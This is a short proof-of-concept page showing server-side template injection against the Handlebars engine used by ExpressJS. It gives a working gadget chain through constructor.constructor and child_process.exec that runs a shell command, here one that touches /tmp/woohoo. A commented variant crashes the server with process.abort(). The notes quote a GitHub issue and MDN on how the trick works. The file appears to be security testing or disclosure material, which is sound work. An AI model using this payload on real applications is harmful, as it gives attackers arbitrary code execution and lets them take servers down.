<h1>POC1: RCE / Handlebar Template Pollution</h1>
<p>This is a test of template pollution against the ExpressJS built-in version of Handlebars.</p>
<p>The below handlebar template should create a file /tmp/woohoo on the host</p>
{{#with 'global.process.mainModule.constructor._load("child_process").exec("/bin/touch /tmp/woohoo",function(){})|'}}
{{#with (split '|' 1)}}
{{#> d constructor.constructor}}
{{> (apply 0 ../this)}}
{{/d}}
{{/with}}
{{/with}}

<p>The above will not render properly but it still results in remote code exec (RCE).</p>

{{!--
This tests resulted in a full abort of the app server:
{{#with 'global.process.abort()|'}}
{{#with (split '|' 1)}}
{{#> d constructor.constructor}}
{{> (apply 0 ../this)}}
{{/d}}
{{/with}}
{{/with}}

NOTES
=====

Stuff that helped me undestand/test for the issue

From https://github.com/wycats/handlebars.js/issues/1267:
It is possible to execute Javascript from a template without registering any helper/partial/whatever or having any function in the context. 
I am not sure if you guys care about this, but it probably is not ideal in the event of a template injection. Anyway, it makes the logicless aspect less logicless.

Here is a sample that would execute whatever is in the initial string (eg: alert(1)) without anything extra registered:

{{#with 'alert(1)|'}}
{{#with (split '|' 1)}}
{{#> p constructor.constructor}}        --> Execute the p partial on a custom context -- context object is: constructor.constructor (Partial Contexts)
{{> (apply 0 ../this)}}                 --> Execute the partial specified from running the function in the parenthesis (Dynamic Partial)
{{/p}}
{{/with}}
{{/with}}

Dynamic partials: https://handlebarsjs.com/partials.html

Function.prototype.apply: 
Ref.: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply
The apply() method calls a function with a given this value, and arguments provided as an array (or an array-like object).
function.apply(thisArg, [argsArray])

thisArg
Optional. The value of this provided for the call to func. Note that this may not be the actual value seen by the method: if the method is a function in 
non-strict mode code, null and undefined will be replaced with the global object, and primitive values will be boxed.

argsArray
Optional. An array-like object, specifying the arguments with which func should be called, or null or undefined if no arguments should be provided to the function. 
Starting with ECMAScript 5 these arguments can be a generic array-like object instead of an array. See below for browser compatibility information.

--}}